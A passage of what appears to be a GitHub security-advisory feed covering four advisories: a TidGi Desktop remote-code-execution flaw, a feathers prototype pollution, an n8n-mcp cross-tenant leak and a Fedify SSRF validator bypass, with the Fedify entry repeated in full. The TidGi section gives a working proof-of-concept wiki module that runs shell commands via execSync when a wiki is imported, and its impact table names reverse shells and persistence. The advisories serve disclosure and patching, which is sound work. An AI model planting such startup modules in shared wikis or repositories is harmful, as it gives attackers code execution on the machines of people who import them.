<pre><code class="language-javascript">if(!$tw.utils.hop(task,"synchronous") || task.synchronous) {
    const thenable = task.startup();  // ← exports.startup() called
</code></pre>
<p><strong>File: <code>node_modules/tiddlywiki/boot/boot.js:2658-2677</code></strong> — Platform check (passes without explicit <code>platforms</code>)</p>
<pre><code class="language-javascript">$tw.boot.doesTaskMatchPlatform = function(taskModule) {
    var platforms = taskModule.platforms;
    if(platforms) {
        // ... check each platform ...
        return false;  // ← only rejects if platforms is explicitly set
    }
    return true;       // ← no platforms field → passes unconditionally
};
</code></pre>
<h3 id="complete-boot-sequence-verified-against-tiddlywiki-540">Complete Boot Sequence (verified against TiddlyWiki 5.4.0)</h3>
<pre><code>$tw.boot.startup()                              // boot.js:2589
  ├── initStartup()                              // boot.js:2393
  ├── loadStartup()                              // boot.js:2538
  │     └── loadTiddlersNode()                   // boot.js:2356
  │           └── $tw.loadWikiTiddlers(wikiPath)  // boot.js:2381
  │                 └── wiki.addTiddlers(...)     // loads .tid files into store
  └── execStartup()                              // boot.js:2553
        ├── defineShadowModules()                 // boot.js:2564
        ├── defineTiddlerModules()                 // boot.js:2565  ← registers attacker's module
        ├── forEachModuleOfType("startup", ...)   // boot.js:2572  ← collects startup modules
        └── executeNextStartupTask()              // boot.js:2611
              └── task.startup()                  // boot.js:2634  ← exports.startup() executes
</code></pre>
<h3 id="exploitation-conditions">Exploitation Conditions</h3>
<ul>
<li><strong>No authentication required</strong> — importing a wiki is a standard feature</li>
<li><strong>Only user interaction</strong>: click "Add Workspace" → select folder/URL → confirm</li>
</ul>
<h3 id="complete-attack-flow">Complete Attack Flow</h3>
<pre><code>┌──────────────────────────────────────────────────────────────┐
│ Step 1: Attacker creates a malicious TiddlyWiki repository   │
├──────────────────────────────────────────────────────────────┤
│  tiddlers/$__plugins__poc__startup.js.tid:                   │
│                                                              │
│    title: $:/plugins/poc/startup.js                          │
│    type: application/javascript                              │
│    module-type: startup                                      │
│                                                              │
│    exports.startup = function() {                            │
│      require('child_process').execSync('calc');              │
│    };                                                        │
│                                                              │
│  + tiddlywiki.info + any other wiki files                    │
└──────────────────────────────────────────────────────────────┘
                          ↓
┌──────────────────────────────────────────────────────────────┐
│ Step 2: Victim imports the repository into TidGi Desktop     │
├──────────────────────────────────────────────────────────────┤
│  Add Workspace → Clone Git Repository / Open Local Folder    │
│  → TidGi boots the wiki                                      │
└──────────────────────────────────────────────────────────────┘
                          ↓
┌──────────────────────────────────────────────────────────────┐
│ Step 3: RCE — startup module auto-executes in Node.js Worker │
├──────────────────────────────────────────────────────────────┤
│  loadWikiTiddlers loads .tid file → wiki.addTiddlers()       │
│  boot.startup() → execStartup()                              │
│  defineTiddlerModules() → $tw.modules.define("startup", ...) │
│  executeNextStartupTask() → exports.startup()                │
│  → require('child_process').execSync('...') executes         │
└──────────────────────────────────────────────────────────────┘
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="minimal-tid-file-place-in-tiddlers-directory">Minimal <code>.tid</code> File (place in <code>tiddlers/</code> directory)</h3>
<pre><code>title: $:/plugins/poc/startup.js
type: application/javascript
module-type: startup

exports.startup = function() {
  require('child_process').execSync('touch /tmp/TidGi-RCE-PoC.txt');
  console.log('STARTUP_EXECUTED');
};
</code></pre>
<h3 id="verification-output-macos-tiddlywiki-540-nodejs-v26">Verification Output (macOS, TiddlyWiki 5.4.0, Node.js v26)</h3>
<pre><code>$ node -e "
  const \$tw = require('tiddlywiki/boot/boot.js').TiddlyWiki();
  \$tw.boot.argv = ['/tmp/evil-wiki'];
  \$tw.boot.startup();
"
STARTUP_EXECUTED

$ ls -la /tmp/TidGi-RCE-PoC.txt
-rw-r--r--  1 nuii  wheel  0 Jun  3 00:01 /tmp/TidGi-RCE-PoC.txt
</code></pre>
<p>The message <code>STARTUP_EXECUTED</code> printed from within the attacker's <code>exports.startup()</code> function, and the file <code>/tmp/TidGi-RCE-PoC.txt</code> was created by <code>execSync('touch ...')</code>, confirming arbitrary command execution.</p>
<h2 id="impact">Impact</h2>
<table>
<thead>
<tr>
<th>Capability</th>
<th>Status</th>
<th>Details</th>
</tr>
</thead>
<tbody><tr>
<td>Remote Code Execution</td>
<td>✅ Full Node.js access</td>
<td><code>require('child_process')</code> available</td>
</tr>
<tr>
<td>Arbitrary File Read</td>
<td>✅</td>
<td><code>require('fs').readFileSync()</code></td>
</tr>
<tr>
<td>Arbitrary File Write</td>
<td>✅</td>
<td><code>require('fs').writeFileSync()</code></td>
</tr>
<tr>
<td>Reverse Shell</td>
<td>✅</td>
<td>Node.js <code>net</code> module</td>
</tr>
<tr>
<td>Persistence</td>
<td>✅</td>
<td>Write to startup scripts, LaunchAgents, crontab</td>
</tr>
<tr>
<td>User Interaction</td>
<td>1 click</td>
<td>Import repository</td>
</tr>
<tr>
<td>Cross-Platform</td>
<td>✅</td>
<td>Windows, macOS, Linux</td>
</tr>
</tbody></table>
<h2 id="reproduction-evidence">Reproduction Evidence</h2>
<h3 id="step-1--malicious-tid-file-content">Step 1 — Malicious <code>.tid</code> file content</h3>
<pre><code>title: $:/plugins/poc/startup.js
type: application/javascript
module-type: startup

exports.startup = function() {
  require('child_process').execSync('touch /tmp/TidGi-RCE-PoC.txt');
  console.log('STARTUP_EXECUTED');
};
</code></pre>
<h3 id="step-2--tiddlywiki-boot-with-malicious-wiki-at-tmpevil-wiki">Step 2 — TiddlyWiki boot with malicious wiki at <code>/tmp/evil-wiki</code></h3>
<pre><code>$ node -e "
  const \$tw = require('tiddlywiki/boot/boot.js').TiddlyWiki();
  \$tw.boot.argv = ['/tmp/evil-wiki'];
  \$tw.boot.startup();
"
STARTUP_EXECUTED
</code></pre>
<h3 id="step-3--verified-rce-tmptidgi-rce-poctxt-created">Step 3 — Verified RCE: <code>/tmp/TidGi-RCE-PoC.txt</code> created</h3>
<pre><code>$ ls -la /tmp/TidGi-RCE-PoC.txt
-rw-r--r--  1 nuii  wheel  0 Jun  3 00:01 /tmp/TidGi-RCE-PoC.txt
</code></pre>
<h2 id="patch-recommendation">Patch Recommendation</h2>
<h3 id="fix-1-disallow-module-type-on-user-tiddlers">Fix 1: Disallow <code>module-type</code> on User Tiddlers</h3>
<p>TiddlyWiki should distinguish between system tiddlers (shipped with TidGi or installed as official plugins) and user-created tiddlers. User-created tiddlers should never be allowed to define <code>module-type</code>.</p>
<pre><code class="language-typescript">// In defineTiddlerModules() or equivalent
if (tiddler.hasField("module-type") &amp;&amp; !tiddler.fields.title.startsWith("$:/")) {
    // User tiddler — silently drop module-type field
    return;
}
</code></pre>
<h3 id="fix-2-sandbox-user-modules">Fix 2: Sandbox User Modules</h3>
<p>If user-created modules must be supported, execute them in a restricted context without access to Node.js built-ins:</p>
<pre><code class="language-typescript">// Replace direct require access with a restricted API surface
const vm = require('vm');
const sandbox = { console, $tw, Buffer };
vm.runInNewContext(moduleCode, sandbox, { timeout: 5000 });
</code></pre>
<h3 id="fix-3-whitelist-allowed-module-type-values">Fix 3: Whitelist Allowed <code>module-type</code> Values</h3>
<p>Only allow known safe <code>module-type</code> values for user tiddlers:</p>
<pre><code class="language-typescript">const ALLOWED_USER_MODULE_TYPES = ['widget', 'macro', 'filter', 'parser'];
if (!ALLOWED_USER_MODULE_TYPES.includes(tiddler.fields['module-type'])) {
    return; // Block startup, library, saver, etc.
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tiddly-gittly/TidGi-Desktop/security/advisories/GHSA-9hc2-hjx8-q6pv">https://github.com/tiddly-gittly/TidGi-Desktop/security/advisories/GHSA-9hc2-hjx8-q6pv</a></li>
<li><a href="https://github.com/advisories/GHSA-9hc2-hjx8-q6pv">https://github.com/advisories/GHSA-9hc2-hjx8-q6pv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9hc2-hjx8-q6pv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-14T19:52:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@feathersjs/commons] Prototype pollution in @feathersjs/commons _.merge via JSON-parsed __proto__]]></title>
        <id>https://github.com/advisories/GHSA-28xv-ph75-77wh</id>
        <link href="https://github.com/advisories/GHSA-28xv-ph75-77wh"/>
        <updated>2026-07-14T19:40:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>_.merge(target, source)</code> utility exported by <code>@feathersjs/commons</code> recursively merges <code>source</code> into <code>target</code> by iterating <code>Object.keys(source)</code>. When <code>source</code> was produced by <code>JSON.parse</code> and contains a <code>__proto__</code> (or <code>constructor</code> / <code>prototype</code>) key, that key is returned as an own-enumerable property. The recursive merge then resolves <code>target['__proto__']</code> to <code>Object.prototype</code> and writes the attacker-supplied properties onto it, polluting the prototype for all plain objects in the process for the lifetime of the Node process.</p>
<p><strong>Scope of real-world risk is limited.</strong> No first-party Feathers package routes input — trusted or untrusted — through <code>commons._.merge</code>. The <code>@feathersjs/authentication</code> package, which does merge request-influenced data, uses <code>lodash/merge</code> (prototype-pollution-safe since 4.17.12), not this utility. Exploitation therefore requires a downstream plugin or application to pass JSON-parsed, attacker-controlled input directly through the exported <code>_.merge</code>.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>@feathersjs/commons@5.0.45</code>. The fix skips <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> keys during iteration — the standard remediation used by lodash and others.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid passing JSON-parsed untrusted input through <code>commons._.merge</code>. Freezing <code>Object.prototype</code> or validating/sanitizing keys upstream also mitigates.</p>
<h3 id="credit">Credit</h3>
<p>Reported responsibly by Andrew Ridings (@ridingsa).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/feathersjs/feathers/security/advisories/GHSA-28xv-ph75-77wh">https://github.com/feathersjs/feathers/security/advisories/GHSA-28xv-ph75-77wh</a></li>
<li><a href="https://github.com/feathersjs/feathers/pull/3690">https://github.com/feathersjs/feathers/pull/3690</a></li>
<li><a href="https://github.com/feathersjs/feathers/commit/28b3c03c63bdbff53115fdaa46c56980e7942acc">https://github.com/feathersjs/feathers/commit/28b3c03c63bdbff53115fdaa46c56980e7942acc</a></li>
<li><a href="https://github.com/feathersjs/feathers/releases/tag/v5.0.45">https://github.com/feathersjs/feathers/releases/tag/v5.0.45</a></li>
<li><a href="https://github.com/advisories/GHSA-28xv-ph75-77wh">https://github.com/advisories/GHSA-28xv-ph75-77wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-28xv-ph75-77wh</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-14T19:40:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n-mcp] n8n-MCP: Cross-tenant access to workflow version backups in multi-tenant HTTP deployments]]></title>
        <id>https://github.com/advisories/GHSA-j6r7-6fhx-77wx</id>
        <link href="https://github.com/advisories/GHSA-j6r7-6fhx-77wx"/>
        <updated>2026-07-14T19:07:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>In multi-tenant HTTP deployments — where a single n8n-mcp server serves several tenants — the locally stored workflow version history (the automatic backups taken before workflow updates) was not isolated per tenant. An authenticated tenant could read workflow version snapshots belonging to other tenants, and could delete or destroy other tenants' stored backups.</p>
<p>A stored snapshot includes full node definitions, so the exposed data can contain credential references and authorization headers configured on nodes. This is therefore a confidentiality issue in addition to an integrity/availability one.</p>
<h2 id="affected-configurations">Affected configurations</h2>
<ul>
<li>HTTP mode with multi-tenancy enabled (<code>ENABLE_MULTI_TENANT=true</code>), where multiple tenants are served by a single shared instance and database.</li>
</ul>
<p>Not affected:</p>
<ul>
<li>stdio / single-user deployments (e.g. Claude Desktop).</li>
<li>Single-tenant HTTP deployments (one tenant per instance and database).</li>
</ul>
<h2 id="affected-versions">Affected versions</h2>
<p><code>&lt;= 2.56.0</code></p>
<h2 id="patched-version">Patched version</h2>
<p><code>2.56.1</code>. The stored version history is now isolated per instance, so a tenant can only access its own backups. Upgrading runs a one-time migration that isolates existing history and clears previously stored, un-scoped backups (these are auto-created, short-retention backups).</p>
<h2 id="workarounds">Workarounds</h2>
<p>If users cannot upgrade immediately:</p>
<ul>
<li>Disable the workflow version tool by setting <code>DISABLED_TOOLS=n8n_workflow_versions</code> in the server environment (for example, in your Docker <code>.env</code>). This removes the affected tool from the deployment for all tenants; automatic backups are unaffected, but the cross-tenant access path is closed.</li>
<li>Alternatively, do not run in multi-tenant mode — serve each tenant from a separate instance with its own database, so no local store is shared between tenants.</li>
<li>Restrict network access to the HTTP endpoint to trusted operators.</li>
</ul>
<p>stdio and single-tenant HTTP deployments are not affected.</p>
<h2 id="credit">Credit</h2>
<p>Reported by Francisco Rosales (@0xmagic0) and coordinated by Ax Sharma (@axsharma) of Manifold Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-j6r7-6fhx-77wx">https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-j6r7-6fhx-77wx</a></li>
<li><a href="https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.56.1">https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.56.1</a></li>
<li><a href="https://github.com/advisories/GHSA-j6r7-6fhx-77wx">https://github.com/advisories/GHSA-j6r7-6fhx-77wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j6r7-6fhx-77wx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-14T19:07:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/vocab-runtime] Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges]]></title>
        <id>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</id>
        <link href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8"/>
        <updated>2026-07-14T18:15:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.</p>
<p>The <code>validatePublicUrl()</code> protection relies on <code>isValidPublicIPv4Address()</code> to reject non-public IPv4 destinations. The function blocks common private and local ranges such as <code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.</p>
<p>Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.</p>
<p>I tested this against the current repository code at unreleased version 2.3.0. I used <code>&gt;=0.11.2, &lt;=2.2.3</code> as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.</p>
<h3 id="why-this-is-not-a-duplicate-of-ghsa-p9cg-vqcc-grcx">Why this is not a duplicate of GHSA-p9cg-vqcc-grcx</h3>
<p>GHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.</p>
<p>This report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.</p>
<p>The affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.</p>
<h3 id="affected-code">Affected Code</h3>
<p>Affected file:</p>
<p><code>packages/vocab-runtime/src/url.ts</code></p>
<p>Current IPv4 validation logic:</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".");
  const first = parseInt(parts[0]);
  if (first === 0 || first === 10 || first === 127) return false;
  const second = parseInt(parts[1]);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;
  return true;
}
</code></pre>
<p>The important point is that the bypass exists in the mitigation logic itself: the function responsible for deciding whether a destination is public returns true for address ranges that are not globally routable public internet destinations.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>I reproduced the IPv4 validation behavior using the same logic:</p>
<pre><code class="language-ts">function isValidPublicIPv4Address(address) {
  const parts = address.split(".");
  const first = parseInt(parts[0], 10);
  if (first === 0 || first === 10 || first === 127) return false;

  const second = parseInt(parts[1], 10);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;

  return true;
}

const tests = [
  "8.8.8.8",
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "169.254.169.254",
  "100.64.0.1",
  "198.18.0.1",
  "224.0.0.1",
  "240.0.0.1",
  "192.0.0.1",
  "192.0.2.1",
  "198.51.100.1",
  "203.0.113.1"
];

for (const ip of tests) {
  console.log(ip + " =&gt; " + isValidPublicIPv4Address(ip));
}
</code></pre>
<p>Observed output:</p>
<pre><code>8.8.8.8 =&gt; true
127.0.0.1 =&gt; false
10.0.0.1 =&gt; false
192.168.1.1 =&gt; false
169.254.169.254 =&gt; false
100.64.0.1 =&gt; true
198.18.0.1 =&gt; true
224.0.0.1 =&gt; true
240.0.0.1 =&gt; true
192.0.0.1 =&gt; true
192.0.2.1 =&gt; true
198.51.100.1 =&gt; true
203.0.113.1 =&gt; true
</code></pre>
<p>The validator correctly blocks some common private and local ranges, but incorrectly allows multiple special-use ranges.</p>
<h3 id="examples-of-incorrectly-allowed-ranges">Examples of incorrectly allowed ranges</h3>
<p>Important examples include:</p>
<pre><code>100.64.0.0/10 Carrier-grade NAT
198.18.0.0/15 Benchmarking / internal testing networks
224.0.0.0/4 Multicast
240.0.0.0/4 Reserved
192.0.0.0/24 IETF protocol assignments
</code></pre>
<p>Additional correctness examples:</p>
<pre><code>192.0.2.0/24 Documentation range
198.51.100.0/24 Documentation range
203.0.113.0/24 Documentation range
</code></pre>
<h2 id="security-impact">Security Impact</h2>
<p>Any Fedify feature that accepts or processes remote ActivityPub object, activity, document, or media URLs and relies on validatePublicUrl() as an SSRF protection boundary may incorrectly allow outbound requests to special-use IPv4 destinations that should not be treated as public internet resources.</p>
<p>This may allow an attacker-controlled ActivityPub object or media URL to cause a Fedify server to initiate requests to non-public or special-use network ranges, depending on the deployment environment and network routing.</p>
<p>This is best understood as an incomplete fix/bypass class for the previous SSRF/internal-network-access advisory GHSA-p9cg-vqcc-grcx.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Avoid using a small manual denylist for public IP validation. Instead, validate that the resolved address is globally routable/public.</p>
<p>At minimum, IPv4 validation should reject all relevant special-use ranges, including:</p>
<pre><code>0.0.0.0/8
10.0.0.0/8
100.64.0.0/10
127.0.0.0/8
169.254.0.0/16
172.16.0.0/12
192.0.0.0/24
192.0.2.0/24
192.168.0.0/16
198.18.0.0/15
198.51.100.0/24
203.0.113.0/24
224.0.0.0/4
240.0.0.0/4
</code></pre>
<p>A safer long-term fix would be to use a maintained IP address classification library that explicitly supports security-sensitive public/global IP validation.</p>
<p>Patch Idea</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".").map((part) =&gt; parseInt(part, 10));

  if (
    parts.length !== 4 ||
    parts.some((part) =&gt; Number.isNaN(part) || part &lt; 0 || part &gt; 255)
  ) {
    return false;
  }

  const [a, b] = parts;

  if (a === 0) return false;
  if (a === 10) return false;
  if (a === 100 &amp;&amp; b &gt;= 64 &amp;&amp; b &lt;= 127) return false;
  if (a === 127) return false;
  if (a === 169 &amp;&amp; b === 254) return false;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return false;
  if (a === 192 &amp;&amp; b === 0) return false;
  if (a === 192 &amp;&amp; b === 168) return false;
  if (a === 198 &amp;&amp; (b === 18 || b === 19)) return false;
  if (a === 198 &amp;&amp; b === 51) return false;
  if (a === 203 &amp;&amp; b === 0) return false;
  if (a &gt;= 224) return false;

  return true;
}
</code></pre>
<h2 id="advisory-classification-note">Advisory Classification Note</h2>
<p>I understand this may be classified either as a new advisory or as an update/incomplete fix for GHSA-p9cg-vqcc-grcx. Since the issue appears to affect the validation logic added after the original SSRF fix, and because the affected code is part of the current security boundary for outbound URL fetching, I wanted to report it privately for maintainer review.</p>
<h2 id="disclosure-note">Disclosure Note</h2>
<p>This report does not attempt to access any real internal network service. The proof focuses on the validation decision itself: multiple non-public or special-use IPv4 ranges are accepted as public by the current SSRF protection logic.</p>
<h2 id="researcher">Researcher</h2>
<p>Reported by Chaitanya Garware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50131">https://nvd.nist.gov/vuln/detail/CVE-2026-50131</a></li>
<li><a href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T18:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/vocab-runtime] Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges]]></title>
        <id>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</id>
        <link href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8"/>
        <updated>2026-07-14T18:15:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.</p>
<p>The <code>validatePublicUrl()</code> protection relies on <code>isValidPublicIPv4Address()</code> to reject non-public IPv4 destinations. The function blocks common private and local ranges such as <code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.</p>
<p>Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.</p>
<p>I tested this against the current repository code at unreleased version 2.3.0. I used <code>&gt;=0.11.2, &lt;=2.2.3</code> as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.</p>
<h3 id="why-this-is-not-a-duplicate-of-ghsa-p9cg-vqcc-grcx">Why this is not a duplicate of GHSA-p9cg-vqcc-grcx</h3>
<p>GHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.</p>
<p>This report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.</p>
<p>The affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.</p>
<h3 id="affected-code">Affected Code</h3>
<p>Affected file:</p>
<p><code>packages/vocab-runtime/src/url.ts</code></p>
<p>Current IPv4 validation logic:</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".");
  const first = parseInt(parts[0]);
  if (first === 0 || first === 10 || first === 127) return false;
  const second = parseInt(parts[1]);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;
  return true;
}
</code></pre>
<p>The important point is that the bypass exists in the mitigation logic itself: the function responsible for deciding whether a destination is public returns true for address ranges that are not globally routable public internet destinations.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>I reproduced the IPv4 validation behavior using the same logic:</p>
<pre><code class="language-ts">function isValidPublicIPv4Address(address) {
  const parts = address.split(".");
  const first = parseInt(parts[0], 10);
  if (first === 0 || first === 10 || first === 127) return false;

  const second = parseInt(parts[1], 10);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;

  return true;
}

const tests = [
  "8.8.8.8",
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "169.254.169.254",
  "100.64.0.1",
  "198.18.0.1",
  "224.0.0.1",
  "240.0.0.1",
  "192.0.0.1",
  "192.0.2.1",
  "198.51.100.1",
  "203.0.113.1"
];

for (const ip of tests) {
  console.log(ip + " =&gt; " + isValidPublicIPv4Address(ip));
}
</code></pre>
<p>Observed output:</p>
<pre><code>8.8.8.8 =&gt; true
127.0.0.1 =&gt; false
10.0.0.1 =&gt; false
192.168.1.1 =&gt; false
169.254.169.254 =&gt; false
100.64.0.1 =&gt; true
198.18.0.1 =&gt; true
224.0.0.1 =&gt; true
240.0.0.1 =&gt; true
192.0.0.1 =&gt; true
192.0.2.1 =&gt; true
198.51.100.1 =&gt; true
203.0.113.1 =&gt; true
</code></pre>
<p>The validator correctly blocks some common private and local ranges, but incorrectly allows multiple special-use ranges.</p>
<h3 id="examples-of-incorrectly-allowed-ranges">Examples of incorrectly allowed ranges</h3>
<p>Important examples include:</p>
<pre><code>100.64.0.0/10 Carrier-grade NAT
198.18.0.0/15 Benchmarking / internal testing networks
224.0.0.0/4 Multicast
240.0.0.0/4 Reserved
192.0.0.0/24 IETF protocol assignments
</code></pre>
<p>Additional correctness examples:</p>
<pre><code>192.0.2.0/24 Documentation range
198.51.100.0/24 Documentation range
203.0.113.0/24 Documentation range
</code></pre>
<h2 id="security-impact">Security Impact</h2>
<p>Any Fedify feature that accepts or processes remote ActivityPub object, activity, document, or media URLs and relies on validatePublicUrl() as an SSRF protection boundary may incorrectly allow outbound requests to special-use IPv4 destinations that should not be treated as public internet resources.</p>
<p>This may allow an attacker-controlled ActivityPub object or media URL to cause a Fedify server to initiate requests to non-public or special-use network ranges, depending on the deployment environment and network routing.</p>
<p>This is best understood as an incomplete fix/bypass class for the previous SSRF/internal-network-access advisory GHSA-p9cg-vqcc-grcx.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Avoid using a small manual denylist for public IP validation. Instead, validate that the resolved address is globally routable/public.</p>
<p>At minimum, IPv4 validation should reject all relevant special-use ranges, including:</p>
<pre><code>0.0.0.0/8
10.0.0.0/8
100.64.0.0/10
127.0.0.0/8
169.254.0.0/16
172.16.0.0/12
192.0.0.0/24
192.0.2.0/24
192.168.0.0/16
198.18.0.0/15
198.51.100.0/24
203.0.113.0/24
224.0.0.0/4
240.0.0.0/4
</code></pre>
<p>A safer long-term fix would be to use a maintained IP address classification library that explicitly supports security-sensitive public/global IP validation.</p>
<p>Patch Idea</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".").map((part) =&gt; parseInt(part, 10));

  if (
    parts.length !== 4 ||
    parts.some((part) =&gt; Number.isNaN(part) || part &lt; 0 || part &gt; 255)
  ) {
    return false;
  }

  const [a, b] = parts;

  if (a === 0) return false;
  if (a === 10) return false;
  if (a === 100 &amp;&amp; b &gt;= 64 &amp;&amp; b &lt;= 127) return false;
  if (a === 127) return false;
  if (a === 169 &amp;&amp; b === 254) return false;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return false;
  if (a === 192 &amp;&amp; b === 0) return false;
  if (a === 192 &amp;&amp; b === 168) return false;
  if (a === 198 &amp;&amp; (b === 18 || b === 19)) return false;
  if (a === 198 &amp;&amp; b === 51) return false;
  if (a === 203 &amp;&amp; b === 0) return false;
  if (a &gt;= 224) return false;

  return true;
}
</code></pre>
<h2 id="advisory-classification-note">Advisory Classification Note</h2>
<p>I understand this may be classified either as a new advisory or as an update/incomplete fix for GHSA-p9cg-vqcc-grcx. Since the issue appears to affect the validation logic added after the original SSRF fix, and because the affected code is part of the current security boundary for outbound URL fetching, I wanted to report it privately for maintainer review.</p>
<h2 id="disclosure-note">Disclosure Note</h2>
<p>This report does not attempt to access any real internal network service. The proof focuses on the validation decision itself: multiple non-public or special-use IPv4 ranges are accepted as public by the current SSRF protection logic.</p>
<h2 id="researcher">Researcher</h2>
<p>Reported by Chaitanya Garware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50131">https://nvd.nist.gov/vuln/detail/CVE-2026-50131</a></li>
<li><a href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
</ul>
